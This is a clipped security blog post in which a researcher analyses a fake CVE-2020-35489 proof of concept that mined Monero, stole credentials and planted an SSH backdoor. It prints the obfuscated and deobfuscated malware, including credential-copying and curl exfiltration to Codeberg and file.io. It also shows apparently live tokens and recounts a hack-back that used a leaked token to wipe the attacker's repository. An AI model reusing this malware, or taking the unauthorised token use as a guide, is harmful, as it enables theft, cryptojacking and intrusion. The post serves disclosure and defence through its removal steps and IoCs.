---
title: "How I Got Hacked: A Warning about Malicious PoCs - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2025/s1nk/
source_host: chocapikk.com
clip_date: 2026-09-24T10:23:25+08:00
trace_id: 309ac8cc-5272-4001-bd18-425a13b634c5
content_hash: 6310605e4a8d5b55c9385f789391edbe3062ccdb0f5e4554fdce1f13825092e2
status: synced
tags:
  - 恶意样本
  - 漏洞分析
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: 伪装成 CVE-2020-35489 PoC 的脚本实为木马，植入门罗币矿工并窃取 SSH 密钥与云凭证；作者借攻击者泄露的 token 反手清空其 Codeberg 仓库。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e575244-d011-8182-ab46-c9ac4b7fa503
ioc:
  cves:
    - CVE-2001-1473
    - CVE-2019-11248
    - CVE-2020-1938
    - CVE-2020-25223
    - CVE-2020-35489
    - CVE-2021-31755
    - CVE-2023-21716
    - CVE-2023-3824
    - CVE-2024-5057
  cwes: []
  hashes:
    - 03eb6e385857430eb9c7004f3cc3531b
    - 1a38a34c6d5dbefb112aa73f54824433f80bb704
    - 28fe4a0f872d4267a8e94b1e2376730b
    - 396a734fc6f154212540fcbb422ec8896e10e8cf
    - 54bf9ee73dd2d04db20fe19284c69d7855aeef66
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 伪装成 CVE-2020-35489 PoC 的脚本实为木马，植入门罗币矿工并窃取 SSH 密钥与云凭证；作者借攻击者泄露的 token 反手清空其 Codeberg 仓库。
> 
> - **感染途径：** 从 GitHub 克隆的 CVE-2020-35489 PoC 中夹带 PDF，执行后释放三个文件：Xsession.sh（主脚本）、xsession.auth（伪装成认证文件的 XMRig 矿工）、xprintidle（空闲检测），落地 `~/.local/bin/` 并注册 systemd 用户服务实现开机自启。
> - **窃取范围：** `~/.ssh` 密钥、bash/zsh 历史、AWS/Azure/Electrum 凭证、环境变量、家目录文件清单等，按 machine-id 打包成 `.tgz`，经 Codeberg API 与 file.io 外传。
> - **反检测与后门：** 脚本以变量拆分 + eval 混淆；发现 htop/top/ps/glances 等监控进程即杀掉矿工；每 12 小时窃密一次，并向 `authorized_keys` 追加攻击者公钥。
> - **反制过程：** 用泄露 token 克隆 `s1nk/sink` 仓库，发现 123+ 个受害者压缩包；以 `rm -rf .git` 重建并 force push 抹除全部历史，再灌垃圾文件；攻击者随后提交 `!ITS-WOW.txt` 回应称将更换新 token，并承认数据已同步到本地。
> - **清理与结论：** 需 `systemctl --user stop/disable Xsession.sh.service`、删除三个恶意文件与 `authorized_keys`、`pkill -f xsession.auth` 后重启；已被外传的数据无法保证收回，PoC 必须逐行审计并在隔离环境运行。

> **Note:** This research was cited at DEF CON 33 and supported investigative work by Datadog threat intel researchers. For the DEF CON reference and a short talk related to this research, see: [https://www.youtube.com/watch?v=iTGnoDEYlog](https://www.youtube.com/watch?v=iTGnoDEYlog)

## Introduction

Late at night, I was testing a proof-of-concept (PoC) exploit for **CVE-2020-35489** ([https://github\[.\]com/gh202503/poc-cve-2020-35489](https://github%5B.%5Dcom/gh202503/poc-cve-2020-35489)) that I found on GitHub. The repository looked legitimate, and in my exhaustion, I skipped the usual precautions. I cloned the repository and ran the script without inspecting its contents.

A few hours later, my system started behaving strangely. CPU usage was abnormally high, and after further investigation, I found that a **hidden malware** had infected my machine. Worse, my credentials, SSH keys, and other sensitive data had been **stolen and uploaded** to an attacker-controlled repository.

As I dug deeper, I discovered that **I wasn’t the only victim**. The attacker had been collecting stolen data from multiple systems, storing it in a **private Codeberg repository**. I had unknowingly handed over access to my system, and now it was time to take it back.

## How the Malware Was Installed

The PoC repository contained a **PDF file**, which seemed unrelated to the exploit. When I executed the fake PoC, an embedded script from the PDF file executed in the background, downloading and running three files:

-   `Xsession.sh` → The main malware script
-   `xsession.auth` → A disguised **Monero miner (XMRig)**
-   `xprintidle` → A utility to detect when the system was idle

The malware **installed itself in `~/.local/bin/`**, made its files executable, and **created a systemd service** to ensure it would restart every time my system booted.

## What the Malware Stole

The malware wasn’t just mining cryptocurrency—it was also stealing as much sensitive information as possible. It collected:

-   **SSH keys** from `~/.ssh/`
-   **Shell history** from `.bash_history` and `.zsh_history`
-   **AWS and Azure credentials** from `~/.aws/` and `~/.azure/`
-   **Environment variables and system information**
-   **Lists of files in my home directory**

The stolen data was then compressed into `.tgz` archives and uploaded to a **private Codeberg repository** controlled by the attacker.

## Where the Stolen Data Was Stored

The attacker stored the stolen data in a private **Codeberg repository** using the following API token:

```plaintext
1a38a34c6d5dbefb112aa73f54824433f80bb704
```

By using this token, I was able to **clone the repository** and see exactly what had been stolen.

### Cloning the Attacker’s Repository

Instead of using the Codeberg API, I cloned the repository directly:

```bash
git clone https://oauth2:1a38a34c6d5dbefb112aa73f54824433f80bb704@codeberg.org/s1nk/sink.git
cd sink
```

Inside the repository, I found **over 123 stolen archives**, all following a naming pattern like this:

```plaintext
03eb6e385857430eb9c7004f3cc3531b_2025-01-29--20-32.tgz
28fe4a0f872d4267a8e94b1e2376730b_2025-01-24--04-51.tgz
```

Extracting these files revealed **highly sensitive data**, including **private SSH keys, cloud credentials, and full home directory dumps** from multiple victims. (I took care to delete all this data from my machine since the victims’ data should not be in my possession either.)

### Investigating the Attacker’s Other Repositories

After confirming the attack, I attempted to **list all the repositories owned by `s1nk`** using the same token.

#### Checking for Public Repositories

```bash
curl -X GET "https://codeberg.org/api/v1/users/s1nk/repos"
```

#### Checking for Private Repositories

```bash
curl -X GET "https://codeberg.org/api/v1/user/repos" \
     -H "Authorization: token 1a38a34c6d5dbefb112aa73f54824433f80bb704"
```

**Listing private repositories** didn’t work due to insufficient permissions.

## How I Took Control of the Attacker’s Repository

Now that I had access to the repository, it was time to take action.

### Step 1: Completely Erasing the Stolen Data

To **completely wipe** the stolen data from the attacker’s repository, I didn’t just delete the files—I went for a **full Git reset** to ensure no traces remained in the commit history.

Instead of using a simple `git rm`, I opted for a **hard reset and forced push**, ensuring the attacker couldn’t revert the changes.

```bash
rm -rf .git
git init
git checkout -b main
git remote add origin https://oauth2:1a38a34c6d5dbefb112aa73f54824433f80bb704@codeberg.org/s1nk/sink.git
git add .
git commit -m "Full repository reset - Removing all stolen data"
git push --force origin main
```

✅ **This method ensures the entire Git history is erased**, making previous commits irrecoverable.

✅ **The repository is left completely clean**, preventing the attacker from retrieving any stolen data.

### Step 2: Leaving a Message for the Attacker

To make sure the attacker knew what happened, I left a **final message** in the repository:

```bash
echo "Your repository has been wiped. Your stolen data is gone. You should reconsider your life choices." > hacked.txt
git add hacked.txt
git commit -m "Final notice"
git push --force origin main
```

Now, instead of their **stolen files**, the only thing left in their repository was **this message**, making it clear that their operation had been disrupted.

### Step 3: Verifying That Everything Was Destroyed

To confirm that the repository had been **successfully wiped**, I re-cloned it and checked the commit history:

```bash
git clone https://oauth2:1a38a34c6d5dbefb112aa73f54824433f80bb704@codeberg.org/s1nk/sink.git
cd sink
git log --all --stat
```

If the only remaining file was `hacked.txt` and all previous commits were gone, that meant the cleanup was **fully successful**. Now, anyone checking the repository would see that it had been **compromised and neutralized**.

### Step 4: Flooding the Repository with Junk Files

To **prevent the attacker from reusing their repository**, I decided to **fill it with thousands of random files**, making it harder for them to clean up and re-upload new stolen data. (I know actually it was useless but I was mad 😭)

```bash
#!/bin/bash

NUM_FILES: 50000  # Number of junk files

for i in $(seq 1 $NUM_FILES); do
    FILE_NAME: "junk_$i.txt"
    head -c 1024 </dev/urandom | base64 > "$FILE_NAME"
    git add "$FILE_NAME"
done

git commit -m "Adding $NUM_FILES junk files"
git push origin main
```

After investigating the **Xsession.sh** script, I discovered that the attacker had **obfuscated** their payload to hide its true purpose. Below is a breakdown of the script, revealing **its malicious intent and the techniques it used.**

### Step 5: The Attacker’s Response: A Smug Comeback

After fully resetting the repository and wiping all stolen data, I noticed something strange— **a new commit appeared almost immediately.** The attacker had left a message in the repo, clearly aware of what had just happened.

```bash
➜  sink git:(main) ✗ cat \!ITS-WOW.txt
Well, simple obfuscation has been expected to be deobfuscated. A new token will be generated and the process will continue.
The "stolen" data is synced to local repo as you understand. So what exactly did you do?

Best wishes%
```

A quick check of the **Git history** confirmed the sequence of events:

```bash
➜  sink git:(main) ✗ git log | tee -a
commit 396a734fc6f154212540fcbb422ec8896e10e8cf
Author: s1nk <s1nk@noreply.codeberg.org>
Date:   Sat Feb 8 00:09:29 2025 +0000

    Add !ITS-WOW.txt

commit 54bf9ee73dd2d04db20fe19284c69d7855aeef66
Author: Chocapikk <balgogan@protonmail.com>
Date:   Sat Feb 8 00:07:38 2025 +0100

    Full repository reset - Removing all stolen data
```

#### So, What Does This Mean?

1.  **The attacker was actively monitoring their repository.** My intervention was noticed in real time, meaning they had some level of automation or manual oversight.
2.  **They confirmed that their payload was obfuscated.** This wasn’t just a sloppy PoC—it was an intentional piece of malware hidden inside a fake exploit.
3.  **They relied on a single API token.** The fact that they mentioned “a new token will be generated” meant that **their attack was dependent on a single access token**, which could be revoked or blocked.
4.  **They admitted to syncing stolen data locally.** Even though I wiped the repository, **the attacker likely had offline copies** of whatever they had stolen before I intervened.

Their response was arrogant, but also revealing. It confirmed that I had at least **disrupted their operations**, forcing them to take further action to re-establish their setup. However, it also meant that my counter-attack wasn’t a full success— **some of my data had already been exfiltrated.**

## Malware Analysis

### The Malicious PoC

The script appears to be a simple Proof-of-Concept (PoC) for an exploit, but in reality, it contains hidden malicious functionality. It abuses a PDF file as a payload carrier.

Due to fatigue, I did not inspect the file properly before execution, assuming it was a legitimate PoC. Since I regularly analyze and develop exploit PoCs, I usually take the time to check every line of code, but this time I trusted it too quickly.

```bash

#/bin/bash

url: $1
loc_ip: $2
loc_port: $3

if [[ $url == "" ]]; then
  echo "Specify url"
  exit 1
fi

if [[ $loc_ip == "" ]]; then
  echo "Specify local ip"
  exit 1
fi

if [[ $loc_port == "" ]]; then
  echo "Specify local port"
  exit 1
fi

stage10: $(cat payload.pdf)
stage21: $(echo "$stage10" | sed -n '/%PDF-1.7/,/%PDF-1.7/p' | sed '1d;$d')
stage22: $(echo "$stage21$loc_ip$loc_port")
payload2: $(eval "$stage21")
payload3: "${payload2}0x2A0x2C0xEF$stage10$stage22"
eval $payload3;
curl -s --output /dev/null -X POST -d "$payload3" "$url"
echo "All done, if successful, you should get reverse shell"
```

Result:

```bash
PEz: '.tar';NDz='TH';RDz='C > ';KCz='ll 2';Oz='mast';uCz='PRIN';eDz='vice';jDz='in/b';VEz='.ser';BBz='/.lo';DBz='bin';WBz='conf';KEz='tall';CDz='E';HBz='sion';TEz=' ena';VCz='l 2>';fBz='mach';ADz='d +x';FCz='ME.s';fz='/raw';bEz=' res';iDz='t=/b';mBz='achi';Mz='_BRA';vz='x.sh';OCz=' $AP';xDz='ppen';rCz='NAME';Pz='er';Vz='raw/';Jz='t/xs';nBz='ne !';oCz='URL';Lz='on';hBz='$(un';BCz='user';dBz='s() ';dCz=' $LO';DCz='p $A';Yz='ANCH';EDz='RIGN';dz='LE_U';NCz='able';QDz='REDO';oBz='= "x';pDz='Rest';DEz='r=ap';Sz='L=$R';gBz='ine=';nCz='ME $';ECz='PPNA';VBz='ME/.';Rz='G_UR';GBz='Xses';ez='RL=$';qBz='4" ]';lCz='_PAT';iz='RANC';kDz='ash ';cEz='tart';GCz='ervi';vCz='TIDL';tBz='exit';Ez='/cod';CBz='cal/';wBz='s';vDz='Outp';SCz='e > ';sDz='ys';iBz='ame ';bz='XPRI';xBz='syst';wCz='E_NA';sz='CH/X';mDz='AL_P';cCz='r -p';sCz=' $XM';EEz='pend';qz='w/$R';QCz='E.se';kCz='OCAL';HEz='on.e';KBz='E=xs';ABz='HOME';rDz='alwa';Zz='/xmr';gDz='Exec';QEz='get';VDz='[Uni';yz='TH=$';jz='H/xp';IBz='.sh';JDz='_NAM';WEz=' > /';PCz='PNAM';GEz='p/Xs';Xz='O_BR';cBz='re_o';yCz='chmo';AEz='mp/X';yDz='d:/t';eCz='CAL_';WCz='&1';XCz=' dae';XDz='Desc';Gz='g.or';pCz='H/$X';CCz=' sto';Qz='XMRI';Uz='URL/';MEz='edBy';hCz=' --o';RBz='SYST';lz='idle';mCz='H/$A';OEz='ault';cz='NTID';eBz='{';NEz='=def';UCz='/nul';PDz='<<HE';oz='O_UR';ICz=' /de';REz='HERE';xz='L_PA';JCz='v/nu';IEz='rr';rBz=']; t';RCz='rvic';xCz='RL';jCz='t $L';HCz='ce >';mz='APP_';vBz='}';XEz='dev/';SEz='DOC';NBz='LE_N';lBz='[ $m';OBz='xpri';FBz='AME=';lDz='$LOC';nDz='ATH/';kBz='if [';YEz='null';FEz=':/tm';HDz='RINT';Bz='_URL';Iz='b0li';ZCz='relo';UEz='ble ';oDz='$APP';wz='LOCA';qDz='art=';TCz='/dev';YDz='ript';BDz='/$AP';hDz='Star';MDz='D_PA';qCz='MRIG';wDz='ut=a';KDz=' $SY';QBz='le';bBz='ensu';aCz='ad >';XBz='ig/s';LBz='on.a';gz='/$RE';bDz='h da';YCz='mon-';tDz='Stan';EBz='APPN';Cz='=htt';YBz='yste';JBz='GNAM';UDz='ce';tz='sess';CEz='Erro';dDz='[Ser';gCz=' -sL';TBz='PATH';rz='BRAN';WDz='t]';GDz='/$XP';uz='ion.';UBz='=$HO';aBz='ser';MCz=' dis';Kz='essi';pBz='86_6';BEz='out';jBz='-m)';JEz='[Ins';fDz=']';ZDz='ion=';DDz='/$XM';Az='REPO';ZEz=' 2>&';iCz='utpu';LDz='STEM';MBz='uth';LEz='Want';uBz='fi';ACz='l --';aDz=' Aut';cDz='emon';fCz='curl';PBz='ntid';az='ig';Fz='eber';yBz='emct';IDz='IDLE';LCz='>&1';nz='URL=';kz='rint';FDz='AME';SBz='EMD_';Hz='g/ai';bCz='mkdi';TDz='TEMD';uDz='dard';SDz='$SYS';aEz='1';sBz='hen';ZBz='md/u';pz='L/ra';Dz='ps:/';Tz='EPO_';Wz='$REP';hz='PO_B';tCz='RIG_';Nz='NCH='; eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Az$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz$dz$ez$Az$Bz$fz$gz$hz$iz$jz$kz$lz$z$mz$nz$Wz$oz$pz$qz$Tz$rz$sz$tz$uz$vz$z$wz$xz$yz$ABz$BBz$CBz$DBz$z$EBz$FBz$GBz$HBz$IBz$z$Qz$JBz$KBz$Kz$LBz$MBz$z$bz$cz$NBz$FBz$OBz$PBz$QBz$z$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$z$bBz$cBz$dBz$eBz$z$fBz$gBz$hBz$iBz$jBz$z$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$z$tBz$z$uBz$z$vBz$z$bBz$cBz$wBz$z$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$z$xBz$yBz$ACz$BCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$xBz$yBz$ACz$BCz$XCz$YCz$ZCz$aCz$ICz$JCz$KCz$LCz$z$bCz$cCz$dCz$eCz$TBz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$ECz$nCz$mz$oCz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$pCz$qCz$rCz$sCz$tCz$oCz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$pCz$uCz$vCz$wCz$nCz$bz$cz$dz$xCz$z$yCz$ADz$dCz$eCz$TBz$BDz$PCz$CDz$z$yCz$ADz$dCz$eCz$TBz$DDz$EDz$FDz$z$yCz$ADz$dCz$eCz$TBz$GDz$HDz$IDz$JDz$CDz$z$bCz$cCz$KDz$LDz$MDz$NDz$z$ODz$PDz$QDz$RDz$SDz$TDz$lCz$mCz$ECz$FCz$GCz$UDz$z$VDz$WDz$z$XDz$YDz$ZDz$GBz$HBz$aDz$bDz$cDz$z$dDz$eDz$fDz$z$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$rCz$z$pDz$qDz$rDz$sDz$z$tDz$uDz$vDz$wDz$xDz$yDz$AEz$tz$uz$BEz$z$tDz$uDz$CEz$DEz$EEz$FEz$GEz$Kz$HEz$IEz$z$JEz$KEz$fDz$z$LEz$MEz$NEz$OEz$PEz$QEz$z$REz$SEz$z$xBz$yBz$ACz$BCz$TEz$UEz$oDz$rCz$VEz$eDz$WEz$XEz$YEz$ZEz$aEz$z$xBz$yBz$ACz$BCz$bEz$cEz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz"aa
```

### Deobfuscated Code

At first glance, the script appears to perform harmless system configuration. However, upon closer inspection, it **downloads and installs a Monero miner, steals credentials, and sets up persistence.**

Snippet of the original, deobfuscated script:

```bash
REPO_URL: https://codeberg.org/aib0lit/xsession
REPO_BRANCH: master
XMRIG_URL: $REPO_URL/raw/$REPO_BRANCH/xmrig
XPRINTIDLE_URL: $REPO_URL/raw/$REPO_BRANCH/xprintidle
APP_URL: $REPO_URL/raw/$REPO_BRANCH/Xsession.x.sh

LOCAL_PATH: $HOME/.local/bin
APPNAME: Xsession.sh
XMRIGNAME: xsession.auth
XPRINTIDLE_NAME: xprintidle
SYSTEMD_PATH: $HOME/.config/systemd/user

ensure_os() {
    machine: $(uname -m)
    if [[ $machine != "x86_64" ]]; then
        exit
    fi
}

ensure_os
systemctl --user stop $APPNAME.service > /dev/null 2>&1
systemctl --user disable $APPNAME.service > /dev/null 2>&1
systemctl --user daemon-reload > /dev/null 2>&1

mkdir -p $LOCAL_PATH
curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL
curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL
curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL

chmod +x $LOCAL_PATH/$APPNAME
chmod +x $LOCAL_PATH/$XMRIGNAME
chmod +x $LOCAL_PATH/$XPRINTIDLE_NAME

mkdir -p $SYSTEMD_PATH
cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
[Unit]
Description: Xsession Auth daemon
[Service]
ExecStart: /bin/bash $LOCAL_PATH/$APPNAME
Restart: always
StandardOutput: append:/tmp/Xsession.out
StandardError: append:/tmp/Xsession.err
[Install]
WantedBy: default.target
HEREDOC

systemctl --user enable $APPNAME.service > /dev/null 2>&1
systemctl --user restart $APPNAME.service > /dev/null 2>&1
```

### What This Code Does

1.  **Downloads and installs three malicious files**:
    
    -   `Xsession.sh` → Main script
    -   `xsession.auth` → **Monero miner (XMRig)**
    -   `xprintidle` → **Idle time detection tool**
2.  **Sets up persistence using systemd**, ensuring the script **restarts on every boot**.
    
3.  **Hides its logs** by redirecting output to `/tmp/Xsession.out` and errors to `/tmp/Xsession.err`.
    

This was just the **initial installation phase**. The next section of the script was responsible for **stealing system data and mining cryptocurrency**.

### Deobfuscating the Malicious Payload

After removing the unnecessary obfuscation, I found the actual malicious behavior hidden inside **Xsession.sh**.

#### Deobfuscated Malware Code

```bash
#!/bin/bash

XMRIGNAME: "xsession.auth"
XPRINTIDLE_NAME: "xprintidle"
WALLET: "45J3v3ooxT335ENFjJBB3s7WS7xGekEKiBW4Z6sRSTUa5Kbn8fbqwgC47SLUDdKsri7haj7PBi5Wvf3xLmrX9CEZ3MGEVJU"
PUBKEY: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXxEYqmT5QcgpUOdFxqgcj3tgOnWYC772AxxqSj+4VmREUbWn9cfMIv78Rn1wZzQpPp9HMAYfHF94niPiCwAXMEVoxbHaN8SKd25JAZ3GLgm12oJjZjz5isg5GCak63CL4/G57VHgmd0iEf4BdVSm04OtTVyUG1l49wt3lobglXPJfRzb4EDR6Rp3KEDJK+pJtMJNA1W3R4HQlSYeNiHcUiT0COcCcN7oXuI96rR0/B9IBjXdBLdYZffy0xaMMee2tYAIR/3MT1AIMOq7AzeGzdxqH1z6PO8MrYAoPcQ7BccXwN/gIdnYvjHcBerFtGBlkTf6dNrQO3iEhMCzIqntrQNXMLC0rQMHUt9Q+RafF4gxxlCRN1yPKmv3/1WqBpwe9mOYo5/e60GCUd+daRExzUJts25Fnd36+36eOzMe67e5ksW7AGDEw/VHL/fmM2NUsnLXSzq4WTEsVUHXtsGgc2dlq1BTnc7x7PCeDecQtduabsmG1bptora/YnNf8Q68= user@host"
LOCAL_PATH: "$HOME/.local/bin"
POOL: "pool.hashvault.pro:80"
INACTIVITY_IN_MINS: 1
INACTIVITY_IN_MSEC: $((INACTIVITY_IN_MINS * 60 * 1000))

print_msg() {
    local msg=$1
    echo "$(date): $msg"
}

run_xmr() {
    cmd: "$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
    if ! pgrep "$XMRIGNAME"; then
        $cmd
    fi
}

monitor_found() {
    local monitors=("top" "htop" "atop" "mate-system-mon" "iostat" "mpstat" "sar" "glances" "dstat" "nmon" "vmstat" "ps")
    for monitor in "${monitors[@]}"; do
        if pgrep -x "$monitor"; then
            killall -q $XMRIGNAME
            return 0
        fi
    done
    return 1
}

grabinfo() {
    local machineid
    local infodir
    machineid: $(cat /etc/machine-id)
    infodir: "/tmp/$machineid"
    mkdir -p "$infodir"

    cp -r "$HOME/.aws" "$infodir" 2>/dev/null
    cp -r "$HOME/.azure" "$infodir" 2>/dev/null
    cp -r "$HOME/.electrum" "$infodir" 2>/dev/null
    cp -r "$HOME/.tox" "$infodir" 2>/dev/null
    cat /proc/cpuinfo > "$infodir/cpuinfo.txt"
    cat /proc/meminfo > "$infodir/meminfo.txt"
    cat /etc/os-release > "$infodir/os-release.txt"
    cp "$HOME/.bash_history" "$infodir/bash_history.txt" 2>/dev/null
    cp "$HOME/.zsh_history" "$infodir/zsh_history.txt" 2>/dev/null
    cp -r "$HOME/.ssh" "$infodir" 2>/dev/null
    ls -all "$HOME" > "$infodir/lshome.txt" 2>/dev/null
    ls -all "$HOME/.config" > "$infodir/lsconf.txt" 2>/dev/null
    env > "$infodir/env.txt" 2>/dev/null
    curl -s "ipinfo.io/?token=7092dca9adef64" > "$infodir/ipinfo.txt" 2>/dev/null
    curl -s ifconfig.me > "$infodir/ifconfig.me.txt" 2>/dev/null
    curl -s "https://check.torproject.org/api/ip" > "$infodir/torcheck.txt" 2>/dev/null
}

get_expire_date() {
    local now
    now: $(date +%s)
    now: $((now + 10 * 24 * 3600))
    date -d "@$now" +"%Y-%m-%d"
}

fileio() {
    local machineid
    local infodir
    local tarfile
    local expdate
    machineid: $(cat /etc/machine-id)
    infodir: "/tmp/$machineid"

    if [ ! -d "$infodir" ]; then
        exit 1
    fi

    tarfile: "/tmp/${machineid}_$(date +"%Y-%m-%d--%H-%M").tgz"
    tar -cf "$tarfile" "$infodir" 2>/dev/null

    if [ -f "$tarfile" ]; then
        expdate: $(get_expire_date)
        curl -s --output /dev/null -X POST \
            -H "accept: application/json" \
            -H "Authorization: Bearer IRHTNTF.YQJYZQP-KVEMN8R-J2BYQPK-FSQZ3PP" \
            -H "Content-Type: multipart/form-data" \
            -F "file=@$tarfile" \
            -F "expires=$expdate" \
            -F "maxDownloads=1" \
            -F "autoDelete=true" "https://file.io/"
    fi
}

codeberg() {
    local machineid
    local infodir
    local tarfilename
    local tarfilepath
    machineid: $(cat /etc/machine-id)
    infodir: "/tmp/$machineid"

    if [ ! -d "$infodir" ]; then
        exit 1
    fi

    tarfilename: "${machineid}_$(date +"%Y-%m-%d--%H-%M").tgz"
    tarfilepath: "/tmp/$tarfilename"
    tar -cf "$tarfilepath" "$infodir" 2>/dev/null

    if [ -f "$tarfilepath" ]; then
        local b64content
        b64content: $(base64 -w 0 "$tarfilepath")
        curl -s --output /dev/null -X POST \
            -H "Authorization: token 1a38a34c6d5dbefb112aa73f54824433f80bb704" \
            -H "Content-Type: application/json" \
            --data-binary @- \
            "https://codeberg.org/api/v1/repos/s1nk/sink/contents/$tarfilename" <<EOF
{
"message": "$(date +"%Y-%m-%d--%H-%M")",
"content": "$b64content",
"branch": "main"
}
EOF
    fi
}

send_report() {
    grabinfo
    codeberg
}

install_auth_key() {
    local sshdir="$HOME/.ssh"
    local keysfile="$sshdir/authorized_keys"

    if [ ! -d "$sshdir" ]; then
        mkdir -p "$sshdir"
        chmod 700 "$sshdir"
    fi

    if ! grep -q "$PUBKEY" "$keysfile" 2>/dev/null; then
        echo "$PUBKEY" >> "$keysfile"
        chmod 600 "$keysfile"
    fi
}

daily_tasks() {
    local interval=$((3600 * 12))
    local pacefile=$LOCAL_PATH/ssesid

    if [ -f "$pacefile" ]; then
        local last
        local now
        last: $(cat "$pacefile")
        now: $(date +%s)

        if [[ $((now - last > interval)) == 1 ]]; then
            send_report
            install_auth_key
            echo "$(date +%s)" > "$pacefile"
        fi
    else
        send_report
        install_auth_key
        echo "$(date +%s)" > "$pacefile"
    fi
}

main() {
    while true; do
        sleep 1
        daily_tasks
        if monitor_found; then
            continue
        fi
        run_xmr
    done
}

main
```

#### Key Findings from the Deobfuscated Code

1.  **Runs a Monero miner** (`xsession.auth`) in the background, using **hashvault.pro:80** as a mining pool.
2.  **Monitors system activity** and **kills itself** if process monitoring tools like `htop` or `glances` are detected.
3.  **Steals sensitive data**:
    -   SSH keys
    -   Shell history
    -   IP address
    -   Environment variables
4.  **Uploads stolen data** to **file.io** using an API token.

## How to Remove the Malware

If you have executed this malware, follow these steps to **completely remove it**:

```bash
# Stop and remove the systemd service
systemctl --user stop Xsession.sh.service
systemctl --user disable Xsession.sh.service
systemctl --user daemon-reload

# Delete the malware files
rm -rf ~/.local/bin/Xsession.sh
rm -rf ~/.local/bin/xsession.auth
rm -rf ~/.local/bin/xprintidle
rm -rf ~/.ssh/authorized_keys

# Kill the running miner process
pkill -f xsession.auth
reboot
```

## Conclusion

This experience was a **harsh reminder to never blindly trust PoC exploits**, especially ones that include **random files like PDFs**. The attacker had successfully stolen credentials from multiple victims, but by leveraging **their own access token**, I was able to:

-   **Clone their repository** and retrieve details on stolen files.
-   **Delete all stolen data** from their Codeberg repository before it could be used.
-   **Flood the repository with garbage files**, making it harder to use.

However, despite successfully wiping their **Codeberg storage**, it appears that **some of my stolen data may still exist on `file.io`**, which the attacker used as an additional exfiltration channel. Since `file.io` operates on an expiration-based system and deletes files after a set period or after a single download, it remains uncertain whether the attacker retrieved the stolen data before it was wiped.

In the end, the **hack back was only partially successful**—I disrupted their operation, but the full extent of the damage they caused remains unknown. This serves as a crucial lesson: once data is exfiltrated, it’s nearly impossible to ensure its full removal from the attacker’s reach.

What makes this even more frustrating is that **I wasn’t careless—I was just tired**. As someone who **regularly reviews PoC exploits and even develops my own**, I usually take the time to inspect every line of code before execution. But this time, fatigue got the best of me. It only took a **moment of inattention** for the attack to succeed.

This is a reminder that **even experienced security researchers and exploit developers can fall victim to well-disguised malware**. Always verify PoCs manually, isolate them in a controlled environment, and never underestimate how **creative** attackers can be when hiding malicious payloads.

### Indicators of Compromise (IoCs) - Attacker Information

#### Malicious Wallet Address (Monero Mining)

```plaintext
45J3v3ooxT335ENFjJBB3s7WS7xGekEKiBW4Z6sRSTUa5Kbn8fbqwgC47SLUDdKsri7haj7PBi5Wvf3xLmrX9CEZ3MGEVJU
```

#### Malicious SSH Public Key (Backdoor Access)

```plaintext
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXxEYqmT5QcgpUOdFxqgcj3tgOnWYC772AxxqSj+4VmREUbWn9cfMIv78Rn1wZzQpPp9HMAYfHF94niPiCwAXMEVoxbHaN8SKd25JAZ3GLgm12oJjZjz5isg5GCak63CL4/G57VHgmd0iEf4BdVSm04OtTVyUG1l49wt3lobglXPJfRzb4EDR6Rp3KEDJK+pJtMJNA1W3R4HQlSYeNiHcUiT0COcCcN7oXuI96rR0/B9IBjXdBLdYZffy0xaMMee2tYAIR/3MT1AIMOq7AzeGzdxqH1z6PO8MrYAoPcQ7BccXwN/gIdnYvjHcBerFtGBlkTf6dNrQO3iEhMCzIqntrQNXMLC0rQMHUt9Q+RafF4gxxlCRN1yPKmv3/1WqBpwe9mOYo5/e60GCUd+daRExzUJts25Fnd36+36eOzMe67e5ksW7AGDEw/VHL/fmM2NUsnLXSzq4WTEsVUHXtsGgc2dlq1BTnc7x7PCeDecQtduabsmG1bptora/YnNf8Q68= user@host
```

#### Mining Pool Used

```plaintext
pool.hashvault.pro:80
```

#### API Endpoints Used for Exfiltration

```plaintext
https://file.io/
https://codeberg.org/api/v1/repos/s1nk/sink/contents/
https://ipinfo.io/?token=7092dca9adef64
https://ifconfig.me
https://check.torproject.org/api/ip
```

#### Malicious API Tokens (Used for Exfiltration & Persistence)

```plaintext
IRHTNTF.YQJYZQP-KVEMN8R-J2BYQPK-FSQZ3PP
1a38a34c6d5dbefb112aa73f54824433f80bb704
```

#### Codeberg Repository Used for Storing Stolen Data

```plaintext
https://codeberg.org/aib0lit/xsession
https://codeberg.org/api/v1/repos/s1nk/sink/contents/
https://codeberg.org/bluef1sher
```

Also, this idiot tested the malware on his own instance. I have full access to all of his private SSH keys, which grant authentication to his GitHub and Codeberg repositories, effectively giving me control over his entire version control infrastructure.

So more IoCs:

```plaintext
https://www.cvepoc.top
git remote add origin git@github.com:s3nd3rjz/poc-CVE-2020-1938.git
git remote add origin git@github.com:sc13nc3apps/MathWorks-MATLAB-R2024a-v24.1.0.2537033-x64-LINUX.git
git remote add origin git@codeberg.org:k0rn66/fileio-api.git
git remote add origin git@codeberg.org:k0rn66/spam.git
